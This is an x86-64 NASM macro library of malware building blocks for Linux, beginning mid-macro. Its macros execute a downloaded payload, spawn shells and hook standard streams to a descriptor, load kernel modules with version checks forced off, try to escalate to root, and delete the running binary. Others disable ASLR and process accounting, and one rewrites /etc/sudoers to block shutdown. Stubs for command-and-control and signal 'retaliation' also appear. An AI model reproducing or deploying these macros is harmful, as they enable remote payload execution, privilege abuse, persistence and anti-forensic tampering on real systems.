    ;// =================>
    xor rax, rax
    mov al, 3
    syscall                         ;// close(3)

    jmp r9                          ;// jmp to the heap address in r9 and execute the downloaded payload

    ;// =========>
    ;// EXIT(0) => this bit is unnecessary if your payload already calls exit()
    ;// =========>
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall

%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x10 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> fd (int)
;
; Remove a file by it's file descriptor
%macro fd_remove 1
    push SYS_REMOVE
    pop rax
    push %1
    pop rdi
    syscall
%endmacro 

; Args -> fd (int)
;
; Same as above, but file is specified via it's filename
%macro file_remove 1
    push SYS_UNLINK
    pop rax
    init_string rdi, %1
    syscall
%endmacro 

; Args -> filename (string), data (string)
;
; Appends arbitrary buffer to a file
%macro file_append 2
    file_open %1, O_RDWR | O_APPEND
    push rax
    pop rdi
    push SYS_LSEEK
    pop rax
    xor rsi, rsi
    push SEEK_END
    pop rdx
    syscall
    init_string rsi, %2
    push rsi
    pop rax
    strlen
    push rax
    pop rdx
    push SYS_WRITE
    pop rax
    syscall
%endmacro

; Args -> filename (string), data (string)
;
; Same as above, but appends arbitrary buffer to a file descriptor
%macro fd_append 2
    push rax
    pop rdi
    push SYS_LSEEK
    pop rax
    xor rsi, rsi
    push SEEK_END
    pop rdx
    syscall
    init_string rsi, %2
    push rsi
    pop rax
    strlen
    push rax
    pop rdx
    push SYS_WRITE
    pop rax
    syscall

%endmacro

; Args -> filename (string), data (string)
;
; Writes arbitrary buffer to a file
%macro file_write 2
    file_open %1, O_RDWR
    push rax
    pop rdi
    push SYS_WRITE
    pop rax
    init_string rsi, %2
    push rsi
    pop rax
    strlen
    push rax
    pop rdx
    syscall
%endmacro

; Args -> fd (int), data (string)
;
; Same as above, but the file is obtained via fd
%macro fd_write 2
    init_string rsi, %2
    push %1
    pop rdi
    push rsi
    pop rax
    strlen
    push rax
    pop rdx
    syscall
%endmacro

%macro file_insert 2

%endmacro

; file
%macro file_read 1

%endmacro

; file
%macro fd_read 1

%endmacro

%macro file_size 1

%endmacro

%macro fd_size 1

%endmacro

; Args -> filename (string)
;
; Creates a file with 0777 chmod
; A new file descriptor is returned in RAX
%macro file_create 1
    init_string rdi, %1
    push SYS_CREAT
    pop rax
    push 0777
    pop rsi
    syscall
%endmacro

%macro file_mmap 0 
	; open the file
	mov rdi, rsi
	mov rax, 2
	mov rsi, 0x402 ; RW mode
	syscall

	cmp rax, 0
	jng end

	mov rbx, rax

	; stat the file to know its length
	mov rsi, rsp
    reserve_stack_bytes_rel STAT_size, rsi
	;sub rsi, STAT_size
	mov rax, 4
	syscall

	; mmap the file
	mov r8, rbx   							; the fd
	mov rsi, [rsi+STAT.st_size] 			; the len

	mov rdi, 0								; we write this shit on the stack
	mov rdx, 6								; protect RW = PROT_READ (0x04) | PROT_WRITE (0x02)
	xor r9, r9								; r9 = 0 <=> offset_start = 0
	mov r10, 0x1   							; flag = MAP_SHARED
	xor rax, rax
	mov rax, 9 								; mmap syscall number
	syscall
%endmacro

; Args -> filename (string), [mode] (variable) 
;
; Opens a file by path specified in %1, in a desired mode
; Default mode is read-only
; File descriptor is returned in RAX
%macro file_open 1-2 O_RDONLY
    call %%opn
    db %1, 0x00
    %%opn:
    pop rdi
    push SYS_OPEN
    pop rax
    xor rdx, rdx
    push %2
    pop rsi
    syscall
%endmacro

; Args -> [source_fd] (register), [dest_fd] (register), [size] (int)
;
; Reads 'size' bytes from source file descriptor and writes them to destination
; Destination file descriptor is returned in 'dest_fd' register and RAX
%macro fd2fd 0-3 r11,r12,2048
    push %3
    pop rdx
    ;mov rdx, 0x400               ; size_t count = 1024 bytes 
    %%read_write_loop:
    ;mov rdi, rbx                 ; Move sockFD to RDI
    push %1
    pop rdi
    xor rax, rax                 ; 0 is read sycall
    reserve_stack_bytes_rel %3,rsi
    ;lea rsi, [rsp-%3]          ; buffer to hold output - arg1 *buf
    syscall                      ; Read syscall
    ;mov rdi, r9                  ; Copy the file descriptor from our local file
    push %2
    pop rdi
    ;mov rdx, rax                 ; RDX = # of bytes read, 0 means end of file
    push rax
    pop rdx
    xor rax, rax                 ; RAX = 0
    push SYS_WRITE
    pop rax
    syscall                      ; Write syscall
    cmp rdx, %3               ; Check if there are still bytes left to read
    je %%read_write_loop 
    push r12
    pop rax
%endmacro

; Args -> register with fd
;
; Commits changes performed on given file descriptor to the filesystem
%macro sync 0-1 rdi
    push SYS_SYNC
    pop rax
    xchg rdi, %1
    syscall
%endmacro

; Args -> [source_with_fd] (register)
;
; Executes file descriptor pointed to by source register
%macro fd_exec 0-1 rdi
    xchg rdi, %1
    xor rdx, rdx
    xor r10, r10
    push SYS_EXECVEAT
    pop rax
    push ""
    pop rsi
    push AT_EMPTY_PATH
    pop r8
    syscall
%endmacro

; Args -> fd (int), force_load (bool)
;
; Loads an external LKM driver pointed to by a given file descriptor
; The fd is passed in RAX by default
; When 'force_load' is set to TRUE, module is loaded without modverersions' hashes and version magic checks
; Based on LKM techniques by @Xcellerator and @netspooky
%macro fd_lkm 0-2 rax,FALSE
    push %1
    pop rdi
    xor rdx, rdx
    xor r10, r10
    push_empty_string rsi
    push SYS_FINIT_MODULE
    pop rax
    push FALSE
    pop rbx
    cmp rbx, %2
    je %%no_force
    push ( MODULE_INIT_IGNORE_MODVERSIONS | MODULE_INIT_IGNORE_VERMAGIC )
    pop rdx
    jmp %%scall
    %%no_force:
    xor rdx, rdx
    %%scall:
    syscall
%endmacro

; :TODO: Fix labels jumper + 0-1 as args
; :TODO: Remove prev_reg_load and add default source register
%macro fd_exec_bg 0-1 rdi
    fork_label_parent %%cont
    xchg rdi, %1
    %%init_fd_self:
    push SYS_EXECVEAT
    pop rax
    push " "
    pop rsi
    push AT_EMPTY_PATH
    pop r8
    syscall
    %%cont:
%endmacro

%macro fd_exec_4 0

%endmacro

; Args -> None
;
; Closes STDIN, STDOUT and STDERR file descriptors
%macro close3 0
    push 2
    pop rcx
    %%lp:
    mov rax, SYS_CLOSE
    mov rdi, rcx
    syscall
    loop %%lp
%endmacro

; Args -> [file descriptor] (int)
;
; Copies STDIN, STDOUT and STDERR to a given file descriptor
; By default, this macro operates on file descriptor specified in RDI
%macro dup2_std 0-1 rdi
    push 2
    pop rcx
    %%lp:
    mov rax, SYS_DUP2
    push %1
    pop rsi
    mov rdi, rcx
    syscall
    loop %%lp
%endmacro

; TODO: Finish fd argument %2
; Args -> [file descriptor] (int)
;
;%macro dup2 0-1 rax
;    push 2
;    pop rcx
;    %%lp:
;    mov rax, SYS_DUP2
;    push %1
;    pop rsi
;    mov rdi, rcx
;    syscall
;    loop %%lp
;%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x11 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> None
;
; This macro requires `get_current_size_var` macro to be called at the end of your .text section
; The size-retrieving macro should be called without any arguments, in order to populate 'fsize' variable used below
; This macro creates a default ELF header, and should be invoked at the beginning of .text section
; Credits -> @RickSanchez 0x00sec
%macro elf_header 0
ehdr:                                          
        db  0x7F, "ELF", 2, 1, 1, 0            
        times 8 db  0                          
        dw  3                                  
        dw  0x3e                               
        dd  1                                  
        dq  _start                             
        dq  phdr - $$                          
        dq  0                                  
        dd  0                                  
        dw  ehdrsize                           
        dw  phdrsize                           
        dw  1                                  
        dw  0                                  
        dw  0                                  
        dw  0                                  
ehdrsize    equ $ - ehdr
phdr:                                          
        dd  1                                  
        dd  5                                  
        dq  0                                  
        dq  $$                                 
        dq  $$                                 
        dq  fsize                           
        dq  fsize                           
        dq  0x1000                             
phdrsize    equ $ - phdr
%endmacro


; Args -> None
;
; Returns number of bytes (in RAX) from the beginning of .text section to the position where this macro was invoked
%macro get_current_size 0
    mov rax, $ - $$
%endmacro

; Args -> None
;
; Returns number of bytes (in RAX) from the point where the macro was invoked to the end of file 
%macro get_current_size_end 0

%endmacro

; Args -> variable_name (string without quotes)
;
; Same as above, but populates 'fsize' variable instead of returning size in RAX.
;%macro get_current_size_var 0-1 fsize 
;    %1 equ $-$$
;%macro


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x12 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> source with *argv0 string (register)
;
; This macro requires `get_current_size_var` macro to be called at the end of your .text section
; The size-retrieving macro should be called without any arguments, in order to populate 'fsize' variable used below
; If the size of the currently running binary is smaller than:
;
;       (.text section size) + (default ELF header size)   
;
; the binary is removed with unlink(2)
; The only argument is optional and should be a register
; It has to contain the name of the binary 
; This macro can be invoked without any arguments - it will load *argv0 from [rsp+8] address
%macro remove_self 0-1 0xffffffff
    push SYS_OPEN
    pop rax
    push %1
    pop r13
    cmp r13, %1
    je %%load_argv0_from_stack:
    push %1
    pop rdi
    jmp %%read
    %%load_argv0_from_stack:
    mov rdi, [rsp+8]
    %%read:
    push O_RDONLY
    pop rsi
    xor rdx, rdx
    syscall
    push rax
    pop rdi
    reserve_stack_bytes_rel STAT_size, rcx 
    push rcx
    pop rsi
    push SYS_FSTAT
    pop rax
    syscall
    push fsize
    pop r13
    add r13, 64 
    cmp qword [ rcx + STAT.st_size ], r13
    jg %%no_remove
    push SYS_UNLINK
    pop rax
    syscall
    %%no_remove:
%endmacro

; Args -> [num_tables] (int)
;
; Initialize a given number of huge pages (2MB each)
; Argument num_tables is optional, and defaults to 15
%macro init_hgtbl 0-1 0x0f
    push    SYS_EXECVE
    pop     rax
    cdq
    %%shell_name: "//bin/sh"
    rel_load rcx, %%shell_name
    mov     rcx, '//bin/sh'
    push    rdx
    push    rcx
    push    rsp
    pop     rdi
    push    rdx
    push    word '-c'
    push    rsp
    pop     rbx
    push    rdx
    .cmd_load:
    call    .x_cmd
    db "ht_enabled=$(grep HugePages_Total /proc/meminfo | awk '{print $NF}')", 0x3b, 0x00
    .x_cmd:
    push    rbx
    push    rdi
    push    rsp
    pop     rsi
    syscall
%endmacro

; Args -> dir (string)
;
; Changes current working directory
%macro chdir 1
    call %%cdr
    db %1, 00
    %%cdr:
    pop rdi
    push SYS_CHDIR
    pop rax
    syscall
%endmacro

; Args -> None
;
; Returns current working directory in RAX register
%macro getcwd 0
    reserve_stack_bytes_rel 50, rdi
    push SYS_GETCWD
    pop rax
    push 50
    pop rsi
    syscall
    push rdi
    pop rax
%endmacro

; Args -> None
;
; Performs partial privillege elevation via setresuid(2)
%macro elevate_uid 0
    push SYS_SETRESUID
    pop rax
    xor rdi, rdi
    xor rdx, rdx
    xor rsi, rsi
    syscall
%endmacro

; Args -> None
;
; Performs partial privillege elevation via setresgid(2)
%macro elevate_gid 0
    push SYS_SETRESGID
    pop rax
    xor rdi, rdi
    xor rdx, rdx
    xor rsi, rsi
    syscall
%endmacro

; Args -> None
;
; Performs full privillege elevation attempt
; Simply combines two above macros
%macro elevate_full 0
    elevate_uid
    cmp rax, -1
    je %%elevate_continue
    jmp %%forward
    %%elevate_continue:
    elevate_gid
    %%forward:
%endmacro

; Args -> None
; 
; If elevated privilleges were detected, 1 is returned in RAX
; If not, 0 is returned
%macro is_root 0
    push SYS_GETEUID
    pop rax
    syscall
    xor rbx, rbx
    cmp rax, rbx
    je %%root_present
    xor rax, rax
    jmp %%finish
    %%root_present:
    xor rax, rax
    dec rax
    neg rax
    %%finish:
%endmacro

;Args -> None
;
; Run '/bin/sh'
%macro spawn_sh 0
    push r9                     
    mov rbx, 0x68732f2f6e69622f 
    push rbx
    mov rdi, rsp                
    push r9                     
    mov rdx, rsp                
    push rdi                    
    mov rsi, rsp                
    push SYS_EXECVE             
    pop rax
    syscall                     
%endmacro

; Args -> None
;
; Same as above, but the shell is spawned in child process
%macro spawn_sh_bg 0
    fork_label_parent %%cont
    push r9                     
    mov rbx, 0x68732f2f6e69622f 
    push rbx
    mov rdi, rsp                
    push r9                     
    mov rdx, rsp                
    push rdi                    
    mov rsi, rsp                
    push SYS_EXECVE             
    pop rax
    syscall                     
    %%cont:
%endmacro

; Args -> [action]
;
; Performs reboot by default, or executes specified action
; Action can be any of: RB_AUTOBOOT, RB_HALT_SYSTEM, 
; RB_ENABLE_CAD, RB_DISABLE_CAD,
; RB_POWER_OFF, RB_SW_SUSPEND or RB_KEXEC	
%macro reboot 0-1 RB_AUTOBOOT
    mov rax, %1
    push rax
    pop rdx
    mov rax, 0x28121969
    push rax
    pop rsi
    mov rax, 0xfee1dead
    push rax
    pop rdi
    push SYS_REBOOT
    pop rax
    syscall
%endmacro

;Args -> [priority] (int)
;
; Sets current process' niceval to a given number
; Argument 'priority' can be set to MAX_PRIO, MIN_PRIO or valid int from -19 to 20
%macro set_priority 0-1 MAX_PRIO
    push SYS_SETPRIORITY
    pop rax
    push PRIO_PROCESS 
    pop rdi
    xor rsi, rsi
    push %1
    pop rdx
    syscall
%endmacro

; Args -> destination (register)
;
; Returns a name of disk where '/' partition is mounted
; It is returned in RAX by default
; !! Full credz for this one go to @netspooky and his mighty Linux.Precinct3.asm
%macro get_root_partition 0-1 rax
    mov rdi, 0x6f666e69         
    push rdi                    
    mov rdi, 0x746e756f6d2f666c 
    push rdi                    
    mov rdi, 0x65732f636f72702f 
    push rdi                    
    mov rdi, rsp                
    xor rsi, rsi                
    mov rax, rsi                
    inc rax                     
    inc rax                     
    syscall                     
    inc rdx                     
    shl rdx, 14                 
    sub rsp, rdx                
    mov r9, rax                 
    mov rdi, rax                
    mov rsi, rsp                
    xor eax, eax                
    syscall                     
    mov di, 0x202f              
    xor rcx, rcx                
    inc rcx                     
    shl rcx, 14                 
    %%comp1: 
    mov bx, word[rsp]           
    cmp di, bx                  
    je %%comp2                  
    dec rcx                     
    jz %%xxit                   
    inc rsp                     
    jmp %%comp1                 
    %%comp2: 
    inc rsp                     
    inc rsp                     
    mov bx, word[rsp]           
    cmp di, bx                  
    je %%comp3                  
    dec rcx                     
    jz %%xxit                   
    dec rcx                     
    jz %%xxit                   
    inc rsp                     
    jmp %%comp1                 
    %%comp3: 
    inc rsp                     
    mov bl, byte[rsp]           
    cmp dil, bl                 
    je %%prep                   
    jmp %%comp3                 
    %%prep: 
    xor rcx, rcx                
    mov dil, 0x20               
    %%getdisk: 
    inc rsp                     
    inc rcx                     
    mov bl, byte[rsp]           
    cmp dil, bl                 
    jne %%getdisk               
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x13 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> command (string)
;
; Executes a command in background
%macro run_bg 1
    fork_label_parent %%cont
    push    0x3b
    pop     rax
    cdq
    mov     rcx, '//bin/sh'
    push    rdx
    push    rcx
    push    rsp
    pop     rdi
    push    rdx
    push    word '-c'
    push    rsp
    pop     rbx
    push    rdx
    %%cmd_load:
    call    %%x_cmd
    db %1, 00
    %%x_cmd:
    push    rbx
    push    rdi
    push    rsp
    pop     rsi
    syscall
    %%cont:
%endmacro

; Args -> command (string), iter (int), interval (int), unit (int)
;
; Executes a command multiple times in background and sleeps given time before each execution
; For example:
;   run_iter "echo A.C.A.B", 3, 5, MINUTES
; will run the echo command three times with five minutes interval between each invocation 
%macro run_bg_iter 4

%endmacro

; Args -> command (string)
;
; Executes a command and waits for it to finish 
%macro run 1
    push    SYS_EXECVE
    pop     rax
    cdq
    mov     rcx, '//bin/sh'
    push    rdx
    push    rcx
    push    rsp
    pop     rdi
    push    rdx
    push    word '-c'
    push    rsp
    pop     rbx
    push    rdx
    call    %%x_cmd
    db %1, 00
    %%x_cmd:
    push    rbx
    push    rdi
    push    rsp
    pop     rsi
    syscall
%endmacro


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x14 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 


; Args -> num_nops (int)
;
; Simply inserts a wanted number of NOP instructions
%macro nops 1
    %rep %1
        nop
    %endrep
%endmacro

; Args -> None
;
; Below macros construct short nopsleds of desired length
; Credits to @travisdowns
%define nopsled_2 db 0x66, 0x90                                           
%define nopsled_3 db 0x0F, 0x1F, 0x00                                     
%define nopsled_4 db 0x0F, 0x1F, 0x40, 0x00                               
%define nopsled_5 db 0x0F, 0x1F, 0x44, 0x00, 0x00                         
%define nopsled_6 db 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00                   
%define nopsled_7 db 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00             
%define nopsled_8 db 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00       
%define nopsled_9 db 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00

; Args -> length (int), [byte] (hex)
;
; Padds the size of the generated NASM output with given byte
; until it reaches size specified by 'length' argument
; Default padding byte is null-byte
%macro padd_byte 1-2 0x00
    times %1 - ($-$$) db %2
%endmacro

; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x15 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 

; Args -> None
;
; Performs an attempt to disable ASLR mechanism
%macro disable_aslr 0
    push SYS_PERSONALITY
    pop rax
    push ADDR_NO_RANDOMIZE
    pop rdi
    syscall
%endmacro

; Args -> None
;
; Disables invocation of "shutdown" command for current user
%macro disable_reboot 0
    run "sed -i '/^ALL/ s/$/ !\/sbin\/shutdown,\/sbin\/reboot,\/sbin\/halt,\/sbin\/poweroff/' /etc/sudoers || chmod a-x /bin/systemctl /sbin/shutdown /sbin/reboot /sbin/halt /sbin/poweroff"
%endmacro

; Args -> None
;
; Disables process accounting mechanism if current process operates in context with elevated privilleges
%macro disable_acct 0
    is_root
    cmp rax, 1
    je %%disable_acct
    jmp %%fwd
    %%disable_acct:
        push SYS_ACCT
        pop rax
        xor rdi, rdi
        syscall
    %%fwd:
%endmacro

; Args -> None
;
; Runs all 'disable_*' macros from above
%macro disable_all 0
    disable_acct
    disable_aslr
    disable_reboot
%endmacro


; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = < * > = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 



;%macro armed_payload 0-1 5555
;    push %1
;    pop rax
;    cmp rax, 1
;    je %%mutex_file
;    %%mutex_sock:
;    %%mutex_file:
;%endmacro

; sigprocmask(2) -> block
; signalfd(2), poll(2)
%macro c2_sig 2

%endmacro


; TODO: Implement last two bool options
; Args -> signum (int), target_whole_procgroup (bool), sendback_same_signal (bool), exhaust (bool)
;
; Waits in background (in a new process) until a signal specified by 'signum' parameter is received by current process group
; Received signall is throwed back at the sender
; If 'target_whole_procgroup' is set to TRUE, the signal is sent back to the whole process group of the sender
; If 'sendback_same_signal' is set to FALSE, the signal that is being sent back is always SIGKILL
; If 'exhaust' parameter is set to TRUE, the sender endlessly receives the signal that it has sent (or until it dies)
;%macro retaliate 0-3 SIGKILL,FALSE,TRUE,FALSE
;    fork_label_parent %%continue
;    sig_mask %1
;    push SYS_SIGNALFD
;    pop rax
;    push -1
;    pop rdi
;    xor rdx, rdx
;    push %1
;    pop rsi
;    syscall
;    push rax
;    pop r9
;    %%read_loop:
;    push 2
;    pop rcx
;    push rax
;    pop rdi
;    xor rax, rax
;    reserve_stack_bytes_rel 128, rsi
;    syscall
;    %%get_sender_pid:
;    mov rcx, [rsi+signal_fd_siginfo.ssi_pid]
;    push %2
;    pop r10
;    cmp r10, TRUE
;    je %%get_sigsender_pgid
;    push rcx
;    pop rdi
;    jmp %%send_sig_back
;    %%get_sigsender_pgid:
;    push SYS_GETPGID
;    pop rax
;    push rcx 
;    pop rdi
;    syscall
;    %%send_sig_back:
;    loop %%read_loop
;    %%epilogue:
;    push SYS_CLOSE
;    pop rax
;    push r9
;    pop rdi
;    syscall
;    %%continue:
;%endmacro
